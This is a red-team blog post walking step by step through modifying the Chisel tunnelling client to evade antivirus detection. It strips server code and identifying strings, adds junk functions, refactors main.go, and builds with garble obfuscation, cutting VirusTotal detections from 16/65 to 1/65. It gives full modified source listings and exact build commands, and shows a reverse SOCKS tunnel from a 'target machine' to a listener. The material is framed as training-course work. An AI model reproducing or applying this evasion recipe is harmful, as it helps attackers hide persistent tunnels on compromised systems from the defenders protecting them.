# https://jadu101.github.io/RedTeam/AV-Evasion/AV-Evasion-with-Chisel

# AV Evasion with Chisel

Jun 24, 202518 min read

- [chisel](https://jadu101.github.io/tags/chisel)
- [av-evasion](https://jadu101.github.io/tags/av-evasion)
- [garble](https://jadu101.github.io/tags/garble)
- [obfuscation](https://jadu101.github.io/tags/obfuscation)
- [virustotal](https://jadu101.github.io/tags/virustotal)
- [edr](https://jadu101.github.io/tags/edr)
- [go](https://jadu101.github.io/tags/go)
- [redteam](https://jadu101.github.io/tags/redteam)

# Chisel Client: From 16/65 to 1/65 flagged on VT

## Introduction

I recently had the opportunity to beta test an excellent course, **RTL (RedTeamLite)**, created by [Red Raccoon](https://www.redraccoon.kr/). One of the chapters provided a customized Chisel client source code that the instructors successfully reduced to **4/65 detections** on VirusTotal. Intrigued, I decided to take on the challenge myself — aiming to match or even surpass their result. By the end of this blog post, I managed to reduce the detection rate from **16/65** to just **1/65** on VirusTotal.

In this post, I’ll walk you through the **five techniques** I used to achieve AV evasion with Chisel:

- Server Functionality Removal
- Hardcoded String Removal
- Adding Junk Code
- Refactoring Code Structure
- Building with Obfuscation

> Special thanks to `@choi` and `@groot` for their invaluable insights shared during the RTL course.

## Original Chisel Analysis

Before diving into the AV evasion techniques, it’s important to take a quick look at [Chisel](https://github.com/jpillora/chisel)’s original source structure to understand what we’re working with.

```
yoon@yoon-XH695R:~/Documents/chisel_custom/chisel-master$ ls -al
total 88
drwxr-xr-x 8 root root  4096 Sep 29  2024 .
dr-xr-xr-x 3 root root  4096 Jun 15 22:04 ..
drwxr-xr-x 2 root root  4096 Sep 29  2024 client
drwxr-xr-x 2 root root  4096 Sep 29  2024 example
drwxr-xr-x 3 root root  4096 Sep 29  2024 .github
-rw-r--r-- 1 root root   325 Sep 29  2024 .gitignore
-rw-r--r-- 1 root root   674 Sep 29  2024 go.mod
-rw-r--r-- 1 root root  2766 Sep 29  2024 go.sum
-rw-r--r-- 1 root root  1089 Sep 29  2024 LICENSE
-rw-r--r-- 1 root root 15506 Sep 29  2024 main.go
-rw-r--r-- 1 root root  1716 Sep 29  2024 Makefile
-rw-r--r-- 1 root root 17636 Sep 29  2024 README.md
drwxr-xr-x 2 root root  4096 Sep 29  2024 server
drwxr-xr-x 8 root root  4096 Sep 29  2024 share
drwxr-xr-x 4 root root  4096 Sep 29  2024 test
```

The project consists of key components like:

- `main.go` – the entry point of the application
- `client/` and `server/` – client and server implementations
- `share/` – shared code between client and server
- `example/`, `test/`, `.github/` – supporting files and examples

Our main focus will be on the `main.go` file, which is the entry point of the Chisel application. This file is responsible for parsing command-line arguments, setting up configurations, and launching the client or server functionality. By customizing `main.go`, we can modify Chisel’s behavior and hopefully reduce detection rates.

### Original Chisel on VT

Let’s first take a look at how the original, unmodified Chisel binary is detected by security solutions.

If you don’t have Go installed, you can install it with: `sudo apt install golang-go`
Now, compile the original Chisel source:

```
go build -o chisel
```

This produces a binary:

```
yoon@yoon-XH695R:~/Documents/chisel_custom/chisel-master$ ls -l chisel
-rwxr-xr-x 1 root root 13223690 Jun 15 22:07 chisel
```

Just to be sure, let’s check whether it works:

```
yoon@yoon-XH695R:~/Documents/chisel_custom/chisel-master$ ./chisel --help

  Usage: chisel [command] [--help]

  Version: 0.0.0-src (go1.22.2)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

Everything looks good — the binary runs and shows its help page.

Next, we upload this unmodified binary to [VirusTotal](https://www.virustotal.com/gui/home/upload) and see how many security vendors find original chisel file to be flagged:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/1.png)

16/65 found it flagged.

Let’s check it on [filescan.io](https://filescan.io/) as well:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/2.png)

Again, the binary is detected as malicious.

Excellent. The reason **16/65 AV engines flagged Chisel** is because **its code, strings, and behavior patterns (networking, tunneling, Go binary fingerprint)** match existing malware signatures and YARA rules.

Now that we’ve established a baseline, it’s time to dive into customizing Chisel for AV evasion.

## AV Evasion

### Goals

I’m pretty sure that there are lot more advanced techniques out there for AV Evasion, but on this post I will be only covering what’s listed below:

- **Eliminate or modify strings commonly flagged by AV signatures** — such as `"chisel"`, `"jpillora"`, version information, and help text.
- **Remove server-side functionality** — to reduce the attack surface, minimize binary size, and make the executable less suspicious.
- **Add junk code strategically** — to disrupt signature-based detection and confuse static analysis tools.
- **Refactor code structure** — to change recognizable patterns and improve obfuscation effectiveness.
- **Compile with obfuscation techniques** — using tools like `garble` to further conceal the binary’s purpose and behavior.

## 1-Remove Server Functionality

When we transfer Chisel binary to the target system, we don’t really need Server functionality since we got the Chisel server running on our listener machine.

So our goal here is to completely remove all server-related code from the binary.

This is how main function in `main.go` looks:

```
func main() {

	version := flag.Bool("version", false, "")
	v := flag.Bool("v", false, "")
	flag.Bool("help", false, "")
	flag.Bool("h", false, "")
	flag.Usage = func() {}
	flag.Parse()

	if *version || *v {
		fmt.Println(chshare.BuildVersion)
		os.Exit(0)
	}

	args := flag.Args()

	subcmd := ""
	if len(args) > 0 {
		subcmd = args[0]
		args = args[1:]
	}

	switch subcmd {
	case "server":
		server(args)
	case "client":
		client(args)
	default:
		fmt.Print(help)
		os.Exit(0)
	}
}
```

Let’s remove the server support from`switch subcmd {}`:

```
switch subcmd {
case "client":
	client(args)
default:
	fmt.Print(help)
	os.Exit(0)
}
```

If there are more server functions like shown below, we will delete it as well:

```
func server(args []string) {
  ...
}
```

Delete the `server/` folder, as it’s no longer needed:

```
sudo rm -r server/
```

Now we are going to update any help text or usage info that still references `server` so it accurately reflects the available functionality.

From:

```
Usage: chisel [server|client] ...
```

To:

```
Usage: chisel client ...
```

Ok, so now we have removed all `server` strings. Let’s try building it:

```
yoon@yoon-XH695R:~/Documents/chisel_custom/chisel-master$ go build -ldflags="-s -w" -o chisel_wo_server
main.go:15:2: no required module provides package github.com/jpillora/chisel/server; to add it:
	go get github.com/jpillora/chisel/server
```

We get an error when building.

We are hitting this because **our code still tries to import the `server` package somewhere**, but we’ve removed or aren’t including the server code:

```
import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	chclient "github.com/jpillora/chisel/client"
	chserver "github.com/jpillora/chisel/server"
	chshare "github.com/jpillora/chisel/share"
	"github.com/jpillora/chisel/share/ccrypto"
	"github.com/jpillora/chisel/share/cos"
	"github.com/jpillora/chisel/share/settings"
)
```

Let’s remove the following lines from `import {}`:

```
"github.com/jpillora/chisel/share/ccrypto"
"github.com/jpillora/chisel/share/settings"
chserver "github.com/jpillora/chisel/server"
```

Now that we have fixed the issue, re-build it and upload the created binary to VT:

After removing server functionality, it’s slightly better: `12/65 security vendors flagged this file as malicious`.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/3.png)

On `filescan.io`, it is marked as `malicious`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/4.png)

Ok, this wasn’t very helpful, but it still did help a bit.

Just to be safe, let’s test if the modified Chisel client works fine/

On our local machine, we will spawn a listener using original Chisel’s server:

```
yoon@yoon-XH695R:~/Documents/chisel_custom/chisel-master$ sudo ./chisel server -p 443 --reverse --socks5 --auth 'blah:blah'
2025/06/15 22:43:32 server: Reverse tunnelling enabled
2025/06/15 22:43:32 server: Fingerprint RsXMzOWZKimqtkiKZNEJNW1ZPPH/lhCee9/qn1QfXaM=
2025/06/15 22:43:32 server: User authentication enabled
2025/06/15 22:43:32 server: Listening on http://0.0.0.0:443

2025/06/15 22:43:37 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

On the target machine, try making a connection to the listener using the customized Chisel client:

```
┌──(carabiner1㉿carabiner)-[~/Documents]
└─$ ./chisel_wo_server client --auth 'blah:blah' 192.168.107.54:443 R:socks

2025/06/15 09:43:37 client: Connecting to ws://192.168.107.54:443
2025/06/15 09:43:37 client: Connected (Latency 2.471812ms)
```

Ok, so everything is working fine.

We need more customization. Let’s move on.

## 2-Hardcoded Strings Removal

Run these commands inside your `chisel-master` folder to locate all occurrences:

```
grep -r "chisel"
grep -r "jpillora"
grep -r "BuildVersion"
grep -r "help"
```

This will show you where those strings appear — usually in `main.go`, `client.go`, `share/`, and maybe `README.md` or `Makefile`.

We will be removing this hardcoded strings for further AV evasion.

But be careful. Some hardcoded strings (like `chisel` in protocol identifiers) **must stay the same** on both client and server to work correctly.

VirusTotal doesn’t care about internal protocol strings that aren’t user-facing; they won’t trigger flags because they’re inside binary comms, not visible in resources or UI.

We need to **target only user-facing strings** or strings that might show up in Command-line help, Version banners, Error messages, and Logs that are printed to stdout/stderr/

These hardcoded strings are usually in:

- `main.go` → the entry point (version printing, help text, log outputs)
- `server.go` / `client.go` → if they print banners, version, or usage messages
- `share/settings/*.go` → if there’s a user-visible settings validation error
- `share/cos/*.go` → if there’s help text or debug output
- `share/tunnel/*.go` → if there are banner messages

We could create a automation script for doing this but I decided to do this manually.

For example, on `main.go`, we can see text messages for the `--help` flag:

```
var clientHelp = `
  Usage:  client [options] <server> <remote> [remote] [remote] ...

  <server> is the URL to the  server.

  <remote>s are remote connections tunneled through the server, each of
  which come in the form:

    <local-host>:<local-port>:<remote-host>:<remote-port>/<protocol>
```

Let’s replace some of the strings that might get flagged:

```
var clientHelp = `
  Usage:  blah [options] <blah> <blah> [blah] [blah] ...

  <blah> is the blah to the  blah.

  <blah>s are blah blah blah through the blah, each of
  which come in the form:

    <blah-blah>:<blah-blah>:<blah-blah>:<blah-blah>/<blah>
```

Look around the file system, searching for keywords like `chisel`, `server`, `jpillora`, `Version`, and etc. But again, be careful when deleting/replacing these strings since it can mess up the entire code easily.

After manually deleting/removing hardcoded texts, build it again:

```
yoon@yoon-XH695R:~/Documents/workplace2/chisel-masterwoserver$ sudo go build -ldflags="-s -w" -o chisel_noserver_hardcode
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/5.png)

Unfortunately, that didn’t do much.

Let’s go further then simply replacing hardcoded strings from user facing interfaces.

We can just delete the entire help message section just to be 100% sure there’s no strings to be potentially flagged:

```
var clientHelp = ``
```

Go through the file system and remove all the help messages in text.

After building and uploading to VT, we get 10/65 flagged:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/6.png)

On `filescan.io`, it is marked as `Suspicious`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/7.png)

Ok, so results got better.

So far, we have removed server functionality and deleted some of the hardcoded strings that could be flagged.

Let’s move on to next technique in AV evasion.

## 3-Adding Junk Code

Next is adding Junk codes.

We can define some fake functions that doesn’t contribute to the logic but this might confuse AV and potentially return us with better result.

Let’s look at an examples.

Below function does some computations and print/discard the results:

```
func uselessFunc1() {
    sum := 0
    for i := 0; i < 10; i++ {
        sum += i * i
    }
    fmt.Println("This is uselessFunc1 running, result hidden")
}

func uselessFunc2(x int) {
    _ = x * 3
    fmt.Println("uselessFunc2 called with", x, "calculated", x*3)
}
```

Junk functions like above could be added to `main.go` to add some noise to AV.

Check on `Code 1` at the Appendix at the end of this blog post to see how we added some junk codes to `main.go`.

Let’s build and upload to VT to test on it again:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/8.png)

Sadly that didn’t do much. We are still stuck `10/65`.

## 4-Refactor Code Structure

AV Evasion they detect not just strings but also patterns in function call and struct layouts.

Let’s try refactoring code structure by changing function names, reordering code in `main.go`, inline simple functions, and renaming exported symbols where possible.

In order to break the direct flow from `main()`, let’s add a new `entryPorint()` function. We can also introduce some junk code calls such as `doUselessWork()` and `moreUselessWork()`which add noise to the programs’s structure:

```
func main() {
	entryPoint()
}

func entryPoint() {
	showVer := flag.Bool("version", false, "")
	shortVer := flag.Bool("v", false, "")
	flag.Bool("help", false, "")
	flag.Bool("h", false, "")
	flag.Usage = func() {}
	flag.Parse()

	if *showVer || *shortVer {
		if time.Now().Year() > 2000 { // fake branching, always true
			fmt.Println(customShare.BuildVersion)
		} else {
			fmt.Println("Version unknown")
		}
		os.Exit(0)
	}

	doUselessWork()
	moreUselessWork(123)

	args := flag.Args()
	command := ""
	if len(args) > 0 {
		command = args[0]
		args = args[1:]
	}

	switch command {
	case "client":
		runClient(args)
	default:
		fmt.Print(helpText)
		os.Exit(0)
	}
}
```

On the client server, we renamed `client()` to `runClient()` and created some fake outputs using `fmt.Printf("Junk output: %s\n", fakeBranch)`:

```
func runClient(arguments []string) {
	clientFlags := flag.NewFlagSet("client", flag.ContinueOnError)
	settings := customClient.Config{Headers: http.Header{}}

	clientFlags.StringVar(&settings.Fingerprint, "fingerprint", "", "")
	clientFlags.StringVar(&settings.Auth, "auth", "", "")
clientFlags.DurationVar(&settings.KeepAlive, 25*time.Second, "")
	// ... (other flag definitions)

	clientFlags.Usage = func() {
		fmt.Print(`blah`)
		os.Exit(0)
	}
	clientFlags.Parse(arguments)

	fakeBranch := "junk"
	fmt.Printf("Junk output: %s\n", fakeBranch)

	args := clientFlags.Args()
	if len(args) < 2 {
		log.Fatalf("Need server + at least one remote")
	}

	settings.Server = args[0]
	settings.Remotes = args[1:]

	if settings.Auth == "" {
		settings.Auth = os.Getenv("AUTH")
	}

	if hostVal := clientFlags.Lookup("hostname"); hostVal != nil && hostVal.Value.String() != "" {
		settings.Headers.Set("Host", hostVal.Value.String())
		settings.TLS.ServerName = hostVal.Value.String()
	}

	// ... remaining logic for creating and starting client
}
```

We will create a custom `headerMap` type that will wrap `http.header` with custom `String()` and `Set()` methods. Original code probably set headers directly but now we introduced indirection:

```
type headerMap struct {
	http.Header
}

func (h *headerMap) String() string {
	var out string
	for k, v := range h.Header {
		out += fmt.Sprintf("%s: %s\n", k, v)
	}
	return out
}

func (h *headerMap) Set(arg string) error {
	i := strings.Index(arg, ":")
	if i < 0 {
		return fmt.Errorf(`Invalid header (%s). Format: "HeaderName: Value"`, arg)
	}
	if h.Header == nil {
		h.Header = http.Header{}
	}
	key := arg[:i]
	val := arg[i+1:]
	h.Header.Set(key, strings.TrimSpace(val))
	return nil
}
```

To check on fully refactored `main.go`, check on `Code 2` at Appendix.

Now that we have gone through some basic refactoring, let’s build & upload on VT again:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/99.png)

Now we got it down to `9/65 flagged`.

## 5-Build with Obfuscation

### Garble

Let’s use [Garble](https://github.com/burrowers/garble) to build with obfuscation

> **Go Garble** is a compiler wrapper for Go that obfuscates Go binaries to make reverse engineering and static analysis harder. It works by renaming symbols, removing debug information, and applying other transformations while preserving normal functionality.

First download `garble` if you don’t have it already:

```
yoon@yoon-XH695R:~/Documents/workplace2$ go install mvdan.cc/garble@latest
go: downloading mvdan.cc/garble v0.14.2
go: mvdan.cc/garble@v0.14.2 requires go >= 1.23.5; switching to go1.23.10
go: downloading go1.23.10 (linux/amd64)
go: downloading github.com/rogpeppe/go-internal v1.14.1
go: downloading golang.org/x/mod v0.24.0
go: downloading golang.org/x/tools v0.32.0
go: downloading github.com/bluekeyes/go-gitdiff v0.8.1
```

Below command will strip out debug info, paths, and apply aggressive size and symbol obfuscation to hinder reverse engineering:

```
yoon@yoon-XH695R:~/Documents/workplace2/chisel-masterwoserver$ garble --tiny build -ldflags="-s -w" -trimpath -o garble2 .
```

Uploading to VT, we have `2/65 flagged`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/9.png)

On `filescan.io`, it is marked as `No Threat`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/10.png)

Just to be sure, let’s test if this build works fine.

On target machine:

```
┌──(carabiner1㉿carabiner)-[~/Documents]
└─$ ./garble2 client --auth 'blah:blah' 192.168.107.54:443 R:socks
doUselessWork called
moreUselessWork processed 123 -> 1122
Junk output: junk
2025/06/16 09:40:21 client: Connecting to ws://192.168.107.54:443
2025/06/16 09:40:21 client: Connected (Latency 2.762365ms)
```

On listener machine:

```
yoon@yoon-XH695R:~/Documents/chisel-master$ sudo ./chisel server -p 443 --reverse --socks5 --auth 'blah:blah'
[sudo] password for yoon:
2025/06/16 22:40:19 server: Reverse tunnelling enabled
2025/06/16 22:40:19 server: Fingerprint 5p6IRICv40htUyU8dFouGUsOcUbH5zA7U1WUzHHHxzw=
2025/06/16 22:40:19 server: User authentication enabled
2025/06/16 22:40:19 server: Listening on http://0.0.0.0:443
2025/06/16 22:40:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Yes! Now we have a working chisel client that we dropped the flag rate from `16/65` to `2/65`!

Let’s try obfuscating a little more.

Let’s implement the below to `garble` command:

- Random seed for obfuscation
- Obfuscate strings and numeric literals
- more `ldflags`
- Clear the build ID
- Tell the linker to statically link external dependencies

```
yoon@yoon-XH695R:~/Documents/workplace2/chisel-masterwoserver$ garble --seed=random --literals --tiny build -ldflags="-s -w -buildid= -extldflags=-static" -trimpath -o garble_stealth .
-seed chosen at random: j8+Puzp8cywpbg+1ZBacQA
# github.com/jpillora/chisel
/usr/bin/ld: /tmp/go-link-854205266/000004.o: in function `_cgo_04fbb8f65a5f_C2func_getaddrinfo':
/tmp/go-build/cgo_unix_cgo.cgo2.c:60:(.text+0x37): warning: Using 'getaddrinfo' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
```

Upon building and uploading to VT, we managed to get it down to `1/65` flagged:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/11.png)

## Summary

Alright. We have successfully customized the Chisel client’s build process to reduce detections on VirusTotal from `16/65` to `1/65`.

I wish we could have got it down to `0/65` but I will leave this part to the readers of this post. If anyone manages to reach this milestone, I’d be interested in learning how you did it.

AV Evasion sounded hard, but it was pretty fun to play with.

For the next coming project, I am thinking of creating personal AV Evasion lab. Hopefully, I will be sharing soon.

Untill then…

Again, special thanks to `@choi` and `@groot`.

I will be back.

## Reference

- RTL (Red Team Lite) from [Red Raccoon](https://www.redraccoon.kr/)

## Appendix

- Code 1: `main.go` with Junk Codes

```
package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	chclient "github.com/jpillora/chisel/client"
	chshare "github.com/jpillora/chisel/share"
	"github.com/jpillora/chisel/share/cos"
)

var help = `blah`

func main() {
	version := flag.Bool("version", false, "")
	v := flag.Bool("v", false, "")
	flag.Bool("help", false, "")
	flag.Bool("h", false, "")
	flag.Usage = func() {}
	flag.Parse()

	if *version || *v {
		fmt.Println(chshare.BuildVersion)
		os.Exit(0)
	}

	// Junk code
	uselessFunc1()
	uselessFunc2(42)

	args := flag.Args()
	subcmd := ""
	if len(args) > 0 {
		subcmd = args[0]
		args = args[1:]
	}

	switch subcmd {
	case "client":
		client(args)
	default:
		fmt.Print(help)
		os.Exit(0)
	}
}

var commonHelp = `blah`

func generatePidFile() {
	pid := []byte(strconv.Itoa(os.Getpid()))
	if err := os.WriteFile("chisel.pid", pid, 0644); err != nil {
		log.Fatal(err)
	}
}

// Junk code
func uselessFunc1() {
	x := 10
	y := 20
	_ = x + y
	fmt.Println("This is uselessFunc1 running, result hidden")
}

func uselessFunc2(val int) int {
	temp := val * 3
	fmt.Printf("uselessFunc2 called with %d, calculated %d\n", val, temp)
	return temp
}

type multiFlag struct {
	values *[]string
}

func (flag multiFlag) String() string {
	return strings.Join(*flag.values, ", ")
}

func (flag multiFlag) Set(arg string) error {
	*flag.values = append(*flag.values, arg)
	return nil
}

type headerFlags struct {
	http.Header
}

func (flag *headerFlags) String() string {
	out := ""
	for k, v := range flag.Header {
		out += fmt.Sprintf("%s: %s\n", k, v)
	}
	return out
}

func (flag *headerFlags) Set(arg string) error {
	index := strings.Index(arg, ":")
	if index < 0 {
		return fmt.Errorf(`Invalid header (%s). Should be in the format "HeaderName: HeaderContent"`, arg)
	}
	if flag.Header == nil {
		flag.Header = http.Header{}
	}
	key := arg[0:index]
	value := arg[index+1:]
	flag.Header.Set(key, strings.TrimSpace(value))
	return nil
}

var clientHelp = `blah` + commonHelp

func client(args []string) {
	flags := flag.NewFlagSet("client", flag.ContinueOnError)
	config := chclient.Config{Headers: http.Header{}}
	flags.StringVar(&config.Fingerprint, "fingerprint", "", "")
	flags.StringVar(&config.Auth, "auth", "", "")
	flags.DurationVar(&config.KeepAlive, "keepalive", 25*time.Second, "")
	flags.IntVar(&config.MaxRetryCount, "max-retry-count", -1, "")
	flags.DurationVar(&config.MaxRetryInterval, "max-retry-interval", 0, "")
	flags.StringVar(&config.Proxy, "proxy", "", "")
	flags.StringVar(&config.TLS.CA, "tls-ca", "", "")
	flags.BoolVar(&config.TLS.SkipVerify, "tls-skip-verify", false, "")
	flags.StringVar(&config.TLS.Cert, "tls-cert", "", "")
	flags.StringVar(&config.TLS.Key, "tls-key", "", "")
	flags.Var(&headerFlags{config.Headers}, "header", "")
	hostname := flags.String("hostname", "", "")
	sni := flags.String("sni", "", "")
	pid := flags.Bool("pid", false, "")
	verbose := flags.Bool("v", false, "")
	flags.Usage = func() {
		fmt.Print(clientHelp)
		os.Exit(0)
	}
	flags.Parse(args)

	// More junk code
	randomStringJunk := "junk"
	fmt.Printf("Random junk string: %s\n", randomStringJunk)

	args = flags.Args()
	if len(args) < 2 {
		log.Fatalf("A server and least one remote is required")
	}
	config.Server = args[0]
	config.Remotes = args[1:]

	if config.Auth == "" {
		config.Auth = os.Getenv("AUTH")
	}

	if *hostname != "" {
		config.Headers.Set("Host", *hostname)
		config.TLS.ServerName = *hostname
	}

	if *sni != "" {
		config.TLS.ServerName = *sni
	}

	c, err := chclient.NewClient(&config)
	if err != nil {
		log.Fatal(err)
	}
	c.Debug = *verbose
	if *pid {
		generatePidFile()
	}
	go cos.GoStats()
	ctx := cos.InterruptContext()
	if err := c.Start(ctx); err != nil {
		log.Fatal(err)
	}
	if err := c.Wait(); err != nil {
		log.Fatal(err)
	}
}
```

- Code 2: `main.go` with refactoring

```
package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	customClient "github.com/jpillora/chisel/client"
	customShare "github.com/jpillora/chisel/share"
	"github.com/jpillora/chisel/share/cos"
)

var helpText = `blah`

func entryPoint() {
	showVer := flag.Bool("version", false, "")
	shortVer := flag.Bool("v", false, "")
	flag.Bool("help", false, "")
	flag.Bool("h", false, "")
	flag.Usage = func() {}
	flag.Parse()

	if *showVer || *shortVer {
		if time.Now().Year() > 2000 { // fake branching, always true
			fmt.Println(customShare.BuildVersion)
		} else {
			fmt.Println("Version unknown")
		}
		os.Exit(0)
	}

	doUselessWork()
	moreUselessWork(123)

	args := flag.Args()
	command := ""
	if len(args) > 0 {
		command = args[0]
		args = args[1:]
	}

	switch command {
	case "client":
		runClient(args)
	default:
		fmt.Print(helpText)
		os.Exit(0)
	}
}

func runClient(arguments []string) {
	clientFlags := flag.NewFlagSet("client", flag.ContinueOnError)
	settings := customClient.Config{Headers: http.Header{}}

	clientFlags.StringVar(&settings.Fingerprint, "fingerprint", "", "")
	clientFlags.StringVar(&settings.Auth, "auth", "", "")
	clientFlags.DurationVar(&settings.KeepAlive, "keepalive", 25*time.Second, "")
	clientFlags.IntVar(&settings.MaxRetryCount, "max-retry-count", -1, "")
	clientFlags.DurationVar(&settings.MaxRetryInterval, "max-retry-interval", 0, "")
	clientFlags.StringVar(&settings.Proxy, "proxy", "", "")
	clientFlags.StringVar(&settings.TLS.CA, "tls-ca", "", "")
	clientFlags.BoolVar(&settings.TLS.SkipVerify, "tls-skip-verify", false, "")
	clientFlags.StringVar(&settings.TLS.Cert, "tls-cert", "", "")
	clientFlags.StringVar(&settings.TLS.Key, "tls-key", "", "")
	clientFlags.Var(&headerMap{settings.Headers}, "header", "")

	hostVal := clientFlags.String("hostname", "", "")
	sniVal := clientFlags.String("sni", "", "")
	writePid := clientFlags.Bool("pid", false, "")
	debugMode := clientFlags.Bool("v", false, "")

	clientFlags.Usage = func() {
		fmt.Print(`blah`)
		os.Exit(0)
	}
	clientFlags.Parse(arguments)

	fakeBranch := "junk"
	fmt.Printf("Junk output: %s\n", fakeBranch)

	args := clientFlags.Args()
	if len(args) < 2 {
		log.Fatalf("Need server + at least one remote")
	}

	settings.Server = args[0]
	settings.Remotes = args[1:]

	if settings.Auth == "" {
		settings.Auth = os.Getenv("AUTH")
	}

	if *hostVal != "" {
		settings.Headers.Set("Host", *hostVal)
		settings.TLS.ServerName = *hostVal
	}

	if *sniVal != "" {
		settings.TLS.ServerName = *sniVal
	}

	clientObj, err := customClient.NewClient(&settings)
	if err != nil {
		log.Fatal(err)
	}

	clientObj.Debug = *debugMode

	if *writePid {
		pidData := []byte(strconv.Itoa(os.Getpid()))
		_ = os.WriteFile("chisel.pid", pidData, 0644)
	}

	go cos.GoStats()

	ctx := cos.InterruptContext()

	if err := clientObj.Start(ctx); err != nil {
		log.Fatal(err)
	}
	if err := clientObj.Wait(); err != nil {
		log.Fatal(err)
	}
}

type headerMap struct {
	http.Header
}

func (h *headerMap) String() string {
	var out string
	for k, v := range h.Header {
		out += fmt.Sprintf("%s: %s\n", k, v)
	}
	return out
}

func (h *headerMap) Set(arg string) error {
	i := strings.Index(arg, ":")
	if i < 0 {
		return fmt.Errorf(`Invalid header (%s). Format: "HeaderName: Value"`, arg)
	}
	if h.Header == nil {
		h.Header = http.Header{}
	}
	key := arg[:i]
	val := arg[i+1:]
	h.Header.Set(key, strings.TrimSpace(val))
	return nil
}

func doUselessWork() {
	a, b := 5, 15
	_ = a * b
	fmt.Println("doUselessWork called")
}

func moreUselessWork(num int) int {
	res := num + 999
	fmt.Printf("moreUselessWork processed %d -> %d\n", num, res)
	return res
}

func main() {
	entryPoint()
}
```

* * *